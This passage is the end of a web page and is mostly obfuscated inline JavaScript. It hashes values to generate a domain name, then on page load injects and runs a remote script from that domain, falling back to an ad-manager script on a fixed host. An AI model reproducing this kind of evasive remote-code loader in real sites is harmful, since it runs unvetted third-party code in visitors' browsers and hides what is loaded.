),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>